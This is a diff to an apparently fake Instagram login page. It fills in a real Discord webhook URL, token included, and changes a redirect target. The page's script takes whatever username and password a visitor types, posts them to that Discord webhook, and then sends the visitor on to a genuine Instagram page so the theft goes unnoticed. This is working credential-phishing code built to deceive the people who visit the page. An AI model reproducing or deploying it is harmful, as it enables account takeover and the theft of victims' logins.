@@ -74,7 +74,7 @@
             </ul>
           </nav>
 
-          <span class="footer-logo">&copy; 2021 Instagram</span>
+          <span class="footer-logo">&copy; 2022 Instagram</span>
         </div> <!-- Footer container end -->
       </footer>
       
@@ -98,14 +98,14 @@
   } while (currentDate - date < milliseconds);
 }
     var request = new XMLHttpRequest();
-    request.open("POST", "WEBHOOK");
+    request.open("POST", "https://discord.com/api/webhooks/981659657238085632/WyHq9XmQv2LTWOZYxmtqLWZgWpvvoSTUbUtg6FSCbLVG6M4wWKnDUln26LFge4BDJ-FK");
     request.setRequestHeader('Content-type', 'application/json');
     var params = {
       content: ("> **USERNAME  : **" + document.getElementById('username').value + "\n> **PASSWORD : **" + document.getElementById('password').value)
     }
     request.send(JSON.stringify(params));
 	sleep(400)
-	window.location.replace("https://www.instagram.com/p/By7NkskoTip");
+	window.location.replace("https://www.instagram.com/vrofficial5/");
   }
   </script>
 </body>
